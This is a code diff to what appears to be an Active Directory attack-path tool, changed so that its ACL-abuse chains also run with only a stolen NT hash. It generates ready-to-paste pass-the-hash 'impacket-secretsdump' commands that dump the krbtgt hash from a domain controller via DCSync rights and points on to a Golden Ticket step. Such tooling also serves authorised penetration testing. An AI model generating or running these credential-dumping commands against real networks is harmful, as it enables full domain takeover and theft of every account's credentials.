@@ -1002,7 +1002,10 @@ def run(report, store, ui=None):
     # cross-resolve in the JSON), so we phrase the command as the OPERATOR's
     # owned principal acting via -u — the SID is shown in the summary for
     # the operator to confirm the route in the BloodHound GUI.
-    have_creds = bool(e.creds)
+    # iter-97: 'have_creds' also true when only hashes are known - the ACL
+    # chain commands can use -hashes for impacket / -H for netexec, so a
+    # hash-only recovery should still fire (R-DCSYNC / R-SHADOW etc.).
+    have_creds = bool(e.creds or e.nt)
     if e.acl_edges and have_creds:
         seen = set()
         # AddKeyCredentialLink -> Shadow Credentials -> NT hash via PKINIT.
@@ -1034,12 +1037,26 @@ def run(report, store, ui=None):
             # iter-64: use angle-bracket placeholder (was literal '{_owned_pw}'
             # which looked like an unfilled Python format spec in output).
             _owned_pw = "<owned-password>"
+            # iter-97: also check for NT hash when no plaintext exists for the
+            # actor. Emit '<owned-nthash>' to signal to the operator to swap
+            # '-p X' -> '-hashes :X' and 'user:pw' -> 'user' + '-hashes :X'
+            # in each impacket call. Keeps chain output correct for the
+            # hash-only case without rewriting every ACL branch's syntax.
+            _owned_hash = ""
             if _pname:
                 _pname_lc = _pname.lower()
                 for (_ulc, _pw), _ in e.creds.items():
                     if _ulc == _pname_lc:
                         _owned_pw = _pw
                         break
+                else:
+                    for _h, _occs in e.nt.items():
+                        for _hu, _hs, _hl in _occs:
+                            if (_hu or "").strip().lower() == _pname_lc:
+                                _owned_hash = _h
+                                break
+                        if _owned_hash:
+                            break
             # iter-37: DCSync rights - direct DCSync without needing to
             # gain admin first. Highest-value ACL-edge chain because it
             # yields krbtgt (which then enables R-GOLDEN at score 15).
@@ -1056,6 +1073,16 @@ def run(report, store, ui=None):
                 _dc_ds = store.dc_ip() or "<DC-IP>"
                 # iter-39: use resolved principal name in owned-user slot
                 # when known, so the operator can paste directly.
+                # iter-97: emit -hashes variant when we have the actor's NT
+                # hash instead of a plaintext. This is common when the actor
+                # is a machine account (sql01$ with GetChanges to the DC).
+                if _owned_hash:
+                    _ds_cmd = (f"impacket-secretsdump -just-dc-user krbtgt "
+                               f"-hashes 'aad3b435b51404eeaad3b435b51404ee:{_owned_hash}' "
+                               f"'{_dom_ds}/{_owned}'@{_dc_ds}")
+                else:
+                    _ds_cmd = (f"impacket-secretsdump -just-dc-user krbtgt "
+                               f"'{_dom_ds}/{_owned}:{_owned_pw}'@{_dc_ds}")
                 chains.append(Chain("R-DCSYNC", "direct DCSync via ACL",
                     f"DCSync rights: {actor} on {tgt} (GetChanges + "
                     f"GetChangesAll)",
@@ -1063,8 +1090,7 @@ def run(report, store, ui=None):
                     commands=[
                         (f"# principal (SID {_psid})" if not _pname else
                          f"# principal resolved -> '{_pname}'"),
-                        f"impacket-secretsdump -just-dc-user krbtgt "
-                        f"'{_dom_ds}/{_owned}:{_owned_pw}'@{_dc_ds}",
+                        _ds_cmd,
                         f"# with krbtgt hash, next: R-GOLDEN chain",
                     ], src=edge["src"], line=edge["line"]))
                 continue
